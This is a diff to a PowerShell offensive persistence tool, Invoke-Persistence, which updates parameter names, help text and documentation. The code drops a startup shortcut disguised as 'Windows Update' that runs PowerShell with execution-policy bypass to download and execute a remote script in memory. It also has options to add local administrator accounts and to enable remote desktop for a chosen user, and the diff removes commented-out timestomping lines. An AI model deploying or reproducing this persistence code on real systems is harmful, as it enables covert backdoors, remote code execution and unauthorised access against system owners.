@@ -1,99 +1,119 @@
 function Invoke-Persistence {
+<# 
+
+.SYNOPSIS
+	Several methods that allow persisting on a target system. 
+
+.PARAMETER Help
+	Shows Detailed Help.
+
+.PARAMETER List
+	Shows Brief Command Help.
+
+.PARAMETER StartupLnk
+	Drops a .LNK file in the current user's startup directory named "Windows Update" that executes a remotely hosted PowerShell script in memory (Net.WebClient DownloadString).
+
+.PARAMETER AddUser
+	Adds a local user. If the [-Admin] parameter is specified, adds an existing user to the local Administrators group. Use the [-Delete] param to delete a user. (Requires Elevation)
+
+.PARAMETER EnableRdp
+Enables remote desktop on the target, and adds an existing user to the Remote Desktop users group. (Requires Elevation)
+
+.EXAMPLE 
+	PS> Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
+
+.EXAMPLE 
+	PS> Invoke-Persistence -AddUser -UserName user2 -password "p@a55wrd"
+	
+.EXAMPLE 
+	Invoke-Persistence -EnableRdp -RdpUser tjones
+
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
+
+#>
+
 [CmdletBinding()]
 param (
-	[Parameter(ParameterSetName = 'Help', Position=1)]
+	[Parameter(Position=1)]
 	[Switch]$Help,
-	
-	[Parameter(ParameterSetName = 'ListCommands')]
 	[switch]$List,
 	
-	[Parameter(ParameterSetName = 'StartupLnk')]
+	[Parameter(Mandatory = $False)]
 	[Switch]$StartupLnk,
-	[String]$PsFileUrl,
+	[String]$PsUrl,
 	[Switch]$Clean,
 	
-	[Parameter(ParameterSetName = 'AddUser')]
+	[Parameter(Mandatory = $False)]
 	[Switch]$AddUser,
 	[String]$UserName,
 	[String]$Password,
 	[Switch]$Admin,
 	[Switch]$Delete,
 	
-	[Parameter(ParameterSetName = 'RemoteDesktop')]
+	[Parameter(Mandatory = $False)]
 	[Switch]$EnableRdp,
-	[String]$RdpUser
-	
+	[String]$RdpUser	
 )
-
-$TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
 
 	if ($Help -eq $True) {
 		Write @"
 		
  ### Invoke-Persistence HELP ###
  -------------------------------
- 
- Invoke-Persistence [-command] [-parameter(s)]
- 
  Available Invoke-Persistence Commands:
  --------------------------------------
- /-----------------------------------------------------------------------------/
- | -StartupLnk [-Clean] [-PsFileUrl] File_url                                  |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Drops a .LNK file in the current user's startup           |
- |      directory that executes a remotely hosted PowerShell script in         |
- |      memory (Net.WebClient DownloadString).                                 |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1060 (Registry Run Keys / Startup Folder)           |
- |     (https://attack.mitre.org/techniques/T1060/)                            |
- |                                                                             |
- |  [*] Usage: Invoke-Persistence -StartupLnk https://yourserver/script.ps1    |
- |  [*] Usage: Invoke-Persistence -StartupLnk -Clean                           |
- |      Removes startup lnk.                                                   |
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+ | -StartupLnk [-Clean] [-PsUrl] File_url                                  |
+ |-----------------------------------------------------------------------------|
 
- /-----------------------------------------------------------------------------/
+   [*] Description: Drops a .LNK file in the current user's startup directory 
+       named "Windows Update" that executes a remotely hosted PowerShell script 
+       in memory (Net.WebClient DownloadString).
+
+   [*] Usage: Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
+   [*] Usage: Invoke-Persistence -StartupLnk -Clean (Removes startup lnk)
+	   
+   [*] Mitre ATT&CK Ref: T1060 (Registry Run Keys / Startup Folder)
+	   
+ |-----------------------------------------------------------------------------|
  | -Adduser [-Username] username [-Password] password [-Admin] [-Delete]       |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Adds a local user. If the [-Admin] parameter is           |
- |      specified, adds an existing user to the local Administrators           |
- |      group. Use the [-Delete] param to delete a user.                       |
- |      (Requires Elevation)                                                   |
- |                                                                             |
- |  [*] Usage: Invoke-Persistence -adduser -username user2 -password "p@a55wrd"|
- |  [*] Usage: Invoke-Persistence -adduser -username user2 -admin              |
- |  [*] Usage: Invoke-Persistence -adduser -username user2 -delete             |
- /-----------------------------------------------------------------------------/
- 
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+
+   [*] Description: Adds a local user. If the [-Admin] parameter is specified, 
+       adds an existing user to the local Administrators group. Use the [-Delete] 
+       param to delete a user. (Requires Elevation)
+
+   [*] Usage: Invoke-Persistence -AddUser -UserName user2 -Password "p@a55wrd"
+   [*] Usage: Invoke-Persistence -AddUser -UserName user2 -Admin
+   [*] Usage: Invoke-Persistence -Adduser -Username user2 -Delete
+
+ |-----------------------------------------------------------------------------|
  | -EnableRdp [-RdpUser] user                                                  |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Enables remote desktop on the target, and adds an existing|
- |  user to the Remote Desktop users group.                                    |
- |                                                                             |
- |      (Requires Elevation)                                                   |
- |                                                                             |
- |  [*] Usage: Invoke-Persistence -EnableRdp -RdpUser tjones                   |
- /-----------------------------------------------------------------------------/
+ |-----------------------------------------------------------------------------|
+
+   [*] Description: Enables remote desktop on the target, and adds an existing
+       user to the Remote Desktop users group. (Requires Elevation)
+
+   [*] Usage: Invoke-Persistence -EnableRdp -RdpUser tjones
+   
+ \-----------------------------------------------------------------------------/
  
 "@
 	}
 	elseif ($List -eq $True) {
 		Write @"
  
- Invoke-Persistence Command List:
- --------------------------------
- Invoke-Persistence -StartupLnk [-Clean] [-PsFileUrl] ps_file_url 
- Invoke-Persistence -Adduser [-Username] username [-Password] password [-Admin] [-Delete]
- Invoke-Persistence -EnableRdp [-RdpUser] user
+ Invoke-Persistence Brief Command Usage:
+ ---------------------------------------
+ Invoke-Persistence -StartupLnk -PsUrl https://yourserver/script.ps1
+ Invoke-Persistence -AddUser -UserName user2 -Password "p@a55wrd"
+ Invoke-Persistence -EnableRdp -RdpUser tjones
  
 "@
 	}
 	
-	elseif ($StartupLnk -and $PsFileURL) {
+	elseif ($StartupLnk -and $PsUrl) {
 		$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
 
 		$PSExe = "$pshome\powershell.exe"
@@ -101,7 +121,7 @@ $TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
 		$LnkCr = $Wss.CreateShortcut("$StartUp\Windows Update.lnk")
 		$LnkCr.TargetPath = $PSExe
 		$LnkCr.Arguments =@"
--ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsFileURL')"
+-ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsUrl')"
 "@
 		$LnkCr.Description ="Windows Update"
 		$LnkCr.IconLocation = "shell32.dll,14"
@@ -111,10 +131,6 @@ $TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
 		$LnkExists = (Test-Path "$StartUp\Windows Update.lnk") 
 		while ($LnkExists -eq $True) {
 			
-#			[IO.File]::SetCreationTime("$StartUp\Windows Update.lnk", [IO.File]::GetCreationTime($TimeSource))
-#			[IO.File]::SetLastAccessTime("$StartUp\Windows Update.lnk", [IO.File]::GetLastAccessTime($TimeSource))
-#			[IO.File]::SetLastWriteTIme("$StartUp\Windows Update.lnk", [IO.File]::GetLastWriteTime($TimeSource))
-			
 			$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
 			$Success = @"
 
@@ -122,7 +138,7 @@ $TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
 	$Startup\Windows Update.lnk file.
 
  [+] LNK Target:
-	$pshome\powershell.exe -ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsFileURL')"
+	$pshome\powershell.exe -ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsUrl')"
 
 "@
 			$h
